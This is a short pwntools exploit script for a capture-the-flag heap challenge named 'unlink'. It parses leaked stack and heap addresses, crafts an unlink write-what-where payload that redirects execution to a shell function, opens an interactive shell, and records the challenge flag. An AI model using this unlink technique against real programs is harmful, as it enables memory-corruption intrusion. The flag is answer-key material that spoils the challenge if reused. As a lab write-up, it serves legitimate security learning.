# When stack address: 0xffffd554
# arg_4h = 0xffffd57c delta = 0x28
# shell: 0x080484eb
# Heap address: 0x0804b570

""" : > wv 0x080484eb @0x0804b578
: > wv 0x0804b57c @0x0804b590
: > wv 0xffffd564 @ 0x0804b594

here is stack address leak: 0xffffd554
here is heap address leak: 0x804b570
now that you have leaks, get shell!

wv 0x080484eb @ 0x0804b578 = > write shell_code address
wv 0x0804b57c @ 0x0804b590 = > write B -> fd
wv 0xffffd564 @ 0x0804b594 = > write B -> bk """

from pwn import process, p32

p = process('./unlink')

r = p.readline()
s_addr = int(r.strip().split(' ')[-1], 16)
print(r)

r = p.readline()
h_addr = int(r.strip().split(' ')[-1], 16)
print(r)

print(p.readline())

shell_addr = 0x080484eb

required_heap_addr = h_addr + 0xc
required_stack_addr = s_addr + 16

payload = p32(shell_addr) + ('A' * 12) + \
    p32(required_heap_addr) + p32(required_stack_addr)

print(":".join("{:02x}".format(ord(c)) for c in payload), len(payload))
print(payload)

p.sendline(payload)
p.interactive()

# Flag: conditional_write_what_where_from_unl1nk_explo1t
